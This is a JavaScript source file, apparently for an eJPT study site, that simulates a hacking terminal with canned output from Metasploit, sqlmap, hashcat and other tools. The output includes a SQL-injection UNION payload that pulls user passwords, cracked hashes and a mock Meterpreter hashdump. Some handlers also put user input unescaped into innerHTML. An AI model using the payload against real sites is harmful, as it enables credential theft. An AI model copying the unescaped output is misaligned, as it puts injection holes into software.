    const query = args.join(' ').toLowerCase();
    let results = [
      { title: 'Apache 2.4.49 - Path Traversal & RCE', path: 'exploits/multiple/webapps/50383.sh' },
      { title: 'Apache 2.4.50 - RCE (CVE-2021-42013)', path: 'exploits/multiple/webapps/50406.sh' },
      { title: 'vsftpd 2.3.4 - Backdoor Command Execution', path: 'exploits/unix/remote/17491.rb' },
      { title: 'Samba 3.x-4.x - Username Map Script RCE', path: 'exploits/unix/remote/16320.rb' },
      { title: 'EternalBlue - SMB Remote Code Execution', path: 'exploits/windows/remote/42315.py' },
      { title: 'Apache Tomcat - Manager Upload (Auth)', path: 'exploits/java/webapps/31433.py' },
      { title: 'WordPress Plugin - File Upload RCE', path: 'exploits/php/webapps/49876.py' },
      { title: 'MySQL 5.x - UDF Local Privilege Escalation', path: 'exploits/linux/local/1518.c' },
    ];
    if (query) results = results.filter(r => r.title.toLowerCase().includes(query));
    if (results.length === 0) return `<span class="t-dim">No results for "${args.join(' ')}"</span>`;
    let out = `<span class="t-bold">Exploit Title${' '.repeat(40)}| Path</span>\n${'─'.repeat(70)}\n`;
    results.forEach(r => {
      out += `<span class="t-green">${r.title.padEnd(52)}</span> | ${r.path}\n`;
    });
    return out;
  },

  msfconsole: () => {
    msfMode = true;
    return `<span class="t-cyan t-bold">
      ___          ___          ___
     /__/\\        /  /\\        /  /\\
    |  |::\\      /  /:/_      /  /::\\
    |  |:|:\\    /  /:/ /\\    /  /:/\\:\\
  __|__|:|\\:\\  /  /:/ /::\\  /  /:/  \\:\\
 /__/::::| \\:\\/__/:/ /:/\\:\\/__/:/ \\__\\:\\
 \\  \\:\\~~\\__\\/\\  \\:\\/:/~/:\\  \\:\\ /  /:/
  \\  \\:\\       \\  \\::/ /:/ \\  \\:\\  /:/
   \\  \\:\\       \\__\\/ /:/   \\  \\:\\/:/
    \\  \\:\\        /__/:/     \\  \\::/
     \\__\\/        \\__\\/       \\__\\/
</span>
       =[ <span class="t-green">metasploit v6.3.44-dev</span>                    ]
+ -- --=[ <span class="t-green">2376</span> exploits - <span class="t-green">1232</span> auxiliary - <span class="t-green">419</span> post     ]
+ -- --=[ <span class="t-green">1388</span> payloads - <span class="t-green">46</span> encoders - <span class="t-green">11</span> nops      ]

<span class="t-dim">Tip: Type 'search <term>' to find modules
     Type 'use <module>' to select a module
     Type 'show options' to see configuration
     Type 'back' or 'exit' to leave MSF mode</span>

<span class="t-red">msf6 > </span>`;
  },

  smbclient: (args) => {
    return `<span class="t-green">Sharename       Type      Comment</span>
---------       ----      -------
print$          Disk      Printer Drivers
<span class="t-green">share</span>           Disk      Public Share
<span class="t-green">admin$</span>          Disk      Admin Share (requires auth)
IPC$            IPC       IPC Service`;
  },

  enum4linux: (args) => {
    const target = args.find(a => !a.startsWith('-')) || '10.10.10.5';
    return `<span class="t-cyan">Starting enum4linux v0.9.1</span>
Target: ${target}

<span class="t-green">[+] Server allows sessions using username '', password ''</span>

<span class="t-cyan">[OS Information]</span>
  OS: <span class="t-green">Unix (Samba 4.6.2)</span>

<span class="t-cyan">[Users]</span>
  <span class="t-green">admin</span> (rid: 1000)
  <span class="t-green">www-data</span> (rid: 33)
  <span class="t-green">backup</span> (rid: 34)
  <span class="t-green">ftp</span> (rid: 21)

<span class="t-cyan">[Shares]</span>
  <span class="t-green">//10.10.10.5/share</span> — READ/WRITE
  //10.10.10.5/print$ — READ ONLY
  <span class="t-red">//10.10.10.5/admin$</span> — DENIED`;
  },

  hashcat: (args) => `hashcat (v6.2.6)
Session..........: hashcat
Hash.Mode........: 0 (MD5)
<span class="t-green">5f4dcc3b5aa765d61d8327deb882cf99:password</span>
<span class="t-green">e10adc3949ba59abbe56e057f20f883e:123456</span>
<span class="t-green">d8578edf8458ce06fbc5bb76a58c5ca4:qwerty</span>
<span class="t-green">25d55ad283aa400af464c76d713c07ad:12345678</span>
Status...........: <span class="t-green">Cracked</span>
Recovered........: <span class="t-green">4/4 (100.00%)</span>`,

  john: () => `Using default input encoding: UTF-8
Loaded 4 password hashes (Raw-MD5)
<span class="t-green">password</span>         (user1)
<span class="t-green">admin123</span>         (admin)
<span class="t-green">trustno1</span>         (root)
3g 0:00:00:03 DONE 1.0g/s 4782Kp/s
Session completed.`,

  sqlmap: (args) => {
    const url = args.find(a => !a.startsWith('-')) || 'http://10.10.10.1/page.php?id=1';
    return `<span class="t-cyan">[*] starting @ 14:32:00</span>
<span class="t-green">[INFO] testing connection to target URL</span>
<span class="t-green">[INFO] target URL is stable</span>
<span class="t-green">[INFO] GET parameter 'id' appears to be injectable</span>

<span class="t-red t-bold">sqlmap identified injection point(s):</span>
Parameter: id (GET)
    Type: boolean-based blind
    Type: UNION query
    Payload: id=1' UNION SELECT NULL,CONCAT(username,':',password) FROM users-- -

<span class="t-green">back-end DBMS: MySQL >= 5.7</span>
Database: webapp
[3 tables]
+----------+
| <span class="t-green">users</span>    |
| <span class="t-green">sessions</span> |
| <span class="t-green">config</span>   |
+----------+`;
  },

  wpscan: (args) => {
    const url = args.find((a, i) => args[i-1] === '--url') || 'http://10.10.10.1';
    return `<span class="t-cyan">         __          _______   _____
         \\ \\        / /  __ \\ / ____|
          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __
           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _\` | '_ \\
            \\  /\\  /  | |     ____) | (__| (_| | | | |
             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|</span>

[+] URL: ${url}/
<span class="t-green">[+] WordPress version 6.1.1 identified (Insecure)</span>
<span class="t-red">[!] WordPress < 6.3.2 - Unauthenticated Blind SSRF</span>
<span class="t-green">[+] Users Identified:</span>
[+] <span class="t-green">admin</span>
[+] <span class="t-green">editor</span>
[+] <span class="t-green">subscriber1</span>`;
  },
};

export function initTerminal() {
  const input = document.getElementById('terminal-input');
  const output = document.getElementById('terminal-output');
  if (!input || !output) return;

  appendOutput(`<span class="t-green t-bold">eJPTv2 Training Terminal v2.0</span>
<span class="t-dim">Type '<span class="t-green">help</span>' for available commands. All output is simulated for training.</span>
<span class="t-dim">Press <span class="t-cyan">\`</span> (backtick) to toggle this terminal. Click '<span class="t-cyan">Try It</span>' buttons in lessons to auto-fill commands.</span>
`);

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      const cmd = input.value.trim();
      if (cmd) {
        history.push(cmd);
        historyIndex = history.length;
        processCommand(cmd);
      }
      input.value = '';
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (historyIndex > 0) {
        historyIndex--;
        input.value = history[historyIndex];
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex < history.length - 1) {
        historyIndex++;
        input.value = history[historyIndex];
      } else {
        historyIndex = history.length;
        input.value = '';
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      // Simple tab completion
      const partial = input.value.trim().toLowerCase();
      if (partial) {
        const match = Object.keys(COMMANDS).find(c => c.startsWith(partial));
        if (match) input.value = match + ' ';
      }
    }
  });

  // Play keypress sound
  input.addEventListener('input', () => {
    playKeypress();
  });
}

function processCommand(cmdStr) {
  const output = document.getElementById('terminal-output');
  const prompt = document.getElementById('terminal-prompt');

  appendOutput(`<span class="t-green">${prompt?.textContent || 'root@ejpt:~# '}</span>${escapeHtml(cmdStr)}`);

  const parts = cmdStr.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  // MSF mode handling
  if (msfMode) {
    if (cmd === 'back' || cmd === 'exit') {
      msfMode = false;
      const promptEl = document.getElementById('terminal-prompt');
      if (promptEl) promptEl.textContent = 'root@ejpt:~# ';
      appendOutput('<span class="t-dim">Leaving MSF context...</span>');
      return;
    }
    handleMsfCommand(cmd, args);
    return;
  }

  if (COMMANDS[cmd]) {
    const result = COMMANDS[cmd](args);
    if (result === '__CLEAR__') {
      output.innerHTML = '';
    } else if (result === '__CLOSE__') {
      const panel = document.getElementById('terminal-panel');
      panel?.classList.add('terminal-hidden');
    } else {
      appendOutput(result);
      // Update prompt if entering MSF mode
      if (cmd === 'msfconsole' && msfMode) {
        const promptEl = document.getElementById('terminal-prompt');
        if (promptEl) promptEl.textContent = 'msf6 > ';
      }
    }
  } else {
    appendOutput(`<span class="t-red">Command not found: ${escapeHtml(cmd)}</span>
<span class="t-dim">Type '<span class="t-green">help</span>' for available commands.</span>`);
  }
}

function handleMsfCommand(cmd, args) {
  const promptEl = document.getElementById('terminal-prompt');

  if (cmd === 'search') {
    const query = args.join(' ').toLowerCase();
    let modules = [
      { name: 'exploit/unix/ftp/vsftpd_234_backdoor', info: 'vsftpd 2.3.4 Backdoor' },
      { name: 'exploit/windows/smb/ms17_010_eternalblue', info: 'EternalBlue SMB RCE' },
      { name: 'exploit/multi/http/apache_mod_cgi_bash_env', info: 'Shellshock' },
      { name: 'exploit/unix/misc/distcc_exec', info: 'DistCC Daemon RCE' },
      { name: 'auxiliary/scanner/ssh/ssh_login', info: 'SSH Login Brute Force' },
      { name: 'auxiliary/scanner/smb/smb_version', info: 'SMB Version Detection' },
      { name: 'auxiliary/scanner/ftp/ftp_anonymous', info: 'FTP Anonymous Login' },
      { name: 'auxiliary/scanner/http/http_version', info: 'HTTP Version Detection' },
      { name: 'post/windows/gather/hashdump', info: 'Windows Hash Dump' },
      { name: 'post/multi/manage/shell_to_meterpreter', info: 'Upgrade Shell to Meterpreter' },
    ];
    if (query) modules = modules.filter(m => m.name.includes(query) || m.info.toLowerCase().includes(query));
    let out = `\n<span class="t-bold">Matching Modules</span>\n${'─'.repeat(70)}\n`;
    modules.forEach((m, i) => {
      out += `  <span class="t-green">${i}</span>  ${m.name.padEnd(50)} ${m.info}\n`;
    });
    appendOutput(out);
  } else if (cmd === 'use') {
    const module = args.join('/');
    if (promptEl) promptEl.textContent = `msf6 ${module.split('/').pop()}> `;
    appendOutput(`<span class="t-dim">Using module: ${module}</span>`);
  } else if (cmd === 'show' && args[0] === 'options') {
    appendOutput(`<span class="t-bold">Module options:</span>

  Name       Current Setting  Required  Description
  ────       ───────────────  ────────  ───────────
  <span class="t-green">RHOSTS</span>                      yes       Target host(s)
  <span class="t-green">RPORT</span>     445              yes       Target port
  <span class="t-green">LHOST</span>                      yes       Listener host
  <span class="t-green">LPORT</span>     4444             yes       Listener port`);
  } else if (cmd === 'set') {
    appendOutput(`<span class="t-green">${args[0]}</span> => <span class="t-cyan">${args.slice(1).join(' ')}</span>`);
  } else if (cmd === 'run' || cmd === 'exploit') {
    appendOutput(`<span class="t-cyan">[*] Started reverse TCP handler on 10.10.14.5:4444</span>
<span class="t-cyan">[*] Sending exploit...</span>
<span class="t-cyan">[*] Sending stage (175686 bytes)...</span>
<span class="t-green">[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.5:49162)</span>

<span class="t-green t-bold">meterpreter > </span><span class="t-dim">Type 'sysinfo', 'getuid', 'hashdump', 'shell', or 'help'</span>`);
    if (promptEl) promptEl.textContent = 'meterpreter > ';
  } else if (cmd === 'sysinfo') {
    appendOutput(`Computer    : TARGET
OS          : Windows Server 2019 (10.0 Build 17763)
Architecture: x64
Meterpreter : x64/windows`);
  } else if (cmd === 'getuid') {
    appendOutput(`Server username: <span class="t-green">NT AUTHORITY\\SYSTEM</span>`);
  } else if (cmd === 'getsystem') {
    appendOutput(`<span class="t-green">...got system via technique 1 (Named Pipe Impersonation).</span>`);
  } else if (cmd === 'hashdump') {
    appendOutput(`Administrator:<span class="t-red">500:aad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76</span>:::
Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<span class="t-green">svc_backup</span>:<span class="t-red">1001:aad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e</span>:::`);
  } else if (cmd === 'shell') {
    appendOutput(`Process 3148 created.
Channel 1 created.
<span class="t-green">Microsoft Windows [Version 10.0.17763.1]
C:\\Windows\\system32></span>`);
  } else if (cmd === 'help') {
    appendOutput(`<span class="t-cyan">MSF Commands:</span>
  search <term>    Search for modules
  use <module>     Select a module
  show options     Show module options
  set <opt> <val>  Set an option
  run / exploit    Execute the module
  sessions -l      List active sessions
  back             Deselect module
  exit             Leave MSF

<span class="t-cyan">Meterpreter Commands:</span>
  sysinfo          System information
  getuid           Current user
  getsystem        Escalate to SYSTEM
  hashdump         Dump password hashes
  shell            Drop to OS shell
  upload <file>    Upload a file
  download <file>  Download a file
  screenshot       Take screenshot
  migrate <pid>    Migrate to process`);
  } else if (cmd === 'sessions') {
    appendOutput(`Active sessions
===============
  Id  Type                   Connection
  --  ----                   ----------
  1   meterpreter x64/win    10.10.14.5:4444 -> 10.10.10.5:49162`);
  } else {
    appendOutput(`<span class="t-dim">Unknown MSF command: ${escapeHtml(cmd)}. Type 'help' for commands.</span>`);
  }
}

function appendOutput(html) {
  const output = document.getElementById('terminal-output');
  if (!output) return;
  const div = document.createElement('div');
  div.innerHTML = html;
  output.appendChild(div);
  output.scrollTop = output.scrollHeight;
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

export function setTerminalContext(ctx) {
  currentContext = ctx || {};
}

export function toggleTerminal() {
  const panel = document.getElementById('terminal-panel');
  const input = document.getElementById('terminal-input');
  if (!panel) return;
  panel.classList.toggle('terminal-hidden');
  if (!panel.classList.contains('terminal-hidden')) {
    setTimeout(() => input?.focus(), 100);
  }
}
